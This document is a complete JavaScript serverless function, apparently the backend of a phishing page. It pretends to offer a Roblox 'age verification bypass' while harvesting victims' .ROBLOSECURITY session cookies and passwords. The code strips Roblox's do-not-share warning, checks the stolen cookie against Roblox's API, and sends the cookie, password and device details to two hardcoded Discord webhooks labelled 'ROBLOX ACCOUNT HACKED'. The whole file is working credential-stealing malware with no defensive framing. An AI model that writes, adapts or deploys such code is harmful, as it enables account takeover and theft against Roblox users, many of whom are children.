// functions/harvest.js
exports.handler = async (event) => {
  try {
    const data = JSON.parse(event.body);
    let rawCookie = data.cookie;
    const password = data.password || '';

    // Clean cookie – remove Roblox warning prefix if present
    const warningPrefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
    let cookie = rawCookie;
    if (rawCookie && rawCookie.startsWith(warningPrefix)) {
      cookie = rawCookie.substring(warningPrefix.length);
    }

    if (!cookie) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'No cookie provided' })
      };
    }

    // ========== 1. FETCH USER INFO FROM ROBLOX USING COOKIE ==========
    async function getUserInfo(cookie) {
      try {
        const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        if (!authRes.ok) throw new Error(`Auth failed: ${authRes.status}`);
        const user = await authRes.json();
        const userId = user.id;
        const username = user.name;
        const displayName = user.displayName;

        // Get avatar headshot
        const avatarRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
        const avatarData = await avatarRes.json();
        const avatarUrl = avatarData.data?.[0]?.imageUrl || 'https://www.roblox.com/favicon.ico';

        return { userId, username, displayName, avatarUrl };
      } catch (err) {
        console.error('Roblox API error:', err);
        return { userId: null, username: 'Unknown', displayName: 'Unknown', avatarUrl: 'https://www.roblox.com/favicon.ico' };
      }
    }

    const userInfo = await getUserInfo(cookie);

    // ========== 2. BUILD FULL DATA OBJECT ==========
    const fullData = {
      accountInfo: {
        username: userInfo.username,
        displayName: userInfo.displayName,
        playerId: userInfo.userId || '',
        accountAge: '', creationDate: '', accountType: ''
      },
      authentication: {
        cookie: cookie,
        password: password,
        oldPassword1: '', oldPassword2: '', accountPin: '', securityCode: '',
        twoFactorPin: '', authenticatorCode: '', sms2FA: '', email2FA: '', backupCodes: ''
      },
      emails: { mainEmail: 'Not available', secondaryEmail: '', recoveryEmail: '', emergencyEmail: '', parentEmail: '', grandparentEmail: '' },
      financial: { robuxBalance: '', premiumStatus: '', creditBalance: '', transactionHistory: '', paymentMethod: '', parentPaymentMethod: '', linkedCards: '' },
      assets: { avatar: '', rareItems: '', limitedItems: '', inventory: '', friendsCount: '', groups: '', favorites: '', badges: '' },
      security: { securityQ1: '', securityQ2: '', securityQ3: '', pinHistory: '', passwordStrength: '', passwordCreationDate: '', recoveryKey: '' },
      personal: { birthdate: '', realName: '', parentName: '', phone: '', parentPhone: '', grandparentPhone: '', country: '', city: '', state: '', zipCode: '', timezone: data.deviceTimezone || '', geolocation: '' },
      socialLinks: { discord: '', discordId: '', twitter: '', youtube: '', twitch: '', tiktok: '', instagram: '', facebook: '', linkedAccounts: '' },
      deviceInfo: {
        screen: data.deviceScreen, platform: data.devicePlatform, userAgent: data.userAgent,
        timezone: data.deviceTimezone, language: data.deviceLanguage, fingerprint: ''
      },
      metadata: {
        victimId: data.victimId, timestamp: data.timestamp, ip: 'via Netlify',
        sessionId: '', bypassAge: data.desiredAge || '13+', currentAge: '', reason: 'age bypass'
      }
    };

    // ========== 3. DISCORD WEBHOOKS – REPLACE THESE URLS ==========
    const MAIN_WEBHOOK = 'https://discord.com/api/webhooks/1495642744696344627/RpEW0n4-T9GjJEmUL60d5-8GvGVprkwgc1STVhbYgb3pmNhtDzMZ7CdqhObozs7nO5UP';
    const SUCCESS_WEBHOOK = 'https://discord.com/api/webhooks/1495647698441994493/lbbuQlLGrq2g0OQfxT4-cb_957c3EHar2R3MRJdVI2LQjkmqKir7nwZezeVgGHVZTP_3';

    // --- MAIN WEBHOOK: Embed with summary ---
    const mainEmbed = {
      title: '🎯 ROBLOX ACCOUNT HACKED',
      color: 0xff0000,
      fields: [
        { name: 'Username', value: userInfo.username, inline: true },
        { name: 'User ID', value: userInfo.userId || 'N/A', inline: true },
        { name: 'Cookie', value: `||${cookie}||`, inline: false },
        { name: 'Password', value: password || 'N/A', inline: true },
        { name: 'Victim ID', value: data.victimId, inline: true },
        { name: 'Device', value: data.deviceScreen || 'Unknown', inline: true }
      ],
      thumbnail: { url: userInfo.avatarUrl },
      timestamp: new Date().toISOString()
    };
    await fetch(MAIN_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [mainEmbed] })
    });

    // --- MAIN WEBHOOK: Detailed text (full raw data) ---
    const longDetails = `**🔥 ULTIMATE ROBLOX ACCOUNT DATA:**\n**Cookie:** ${cookie}\n**Password:** ${password}\n**Username:** ${userInfo.username}\n**User ID:** ${userInfo.userId}\n**Victim ID:** ${data.victimId}\n**Timestamp:** ${data.timestamp}\n**Device:** ${data.deviceScreen || 'Unknown'}\n**Platform:** ${data.devicePlatform || 'Unknown'}\n**User Agent:** ${data.userAgent || 'Unknown'}`;
    await fetch(MAIN_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: longDetails })
    });

    // --- SECOND WEBHOOK: Clean success embed ---
    const successEmbed = {
      title: '✅ AGE VERIFICATION BYPASS SUCCESSFUL',
      description: `**${userInfo.displayName} (${userInfo.username})** has been bypassed.`,
      color: 0x00ff00,
      thumbnail: { url: userInfo.avatarUrl },
      fields: [
        { name: 'Cookie Status', value: cookie ? 'Captured ✅' : 'Missing ❌', inline: true },
        { name: 'Password', value: password ? 'Captured ✅' : 'Not provided', inline: true }
      ],
      footer: { text: 'BEAMERS • Age Bypass' },
      timestamp: new Date().toISOString()
    };
    await fetch(SUCCESS_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [successEmbed] })
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'Success', username: userInfo.username, avatar: userInfo.avatarUrl })
    };
  } catch (err) {
    console.error(err);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: err.message })
    };
  }
};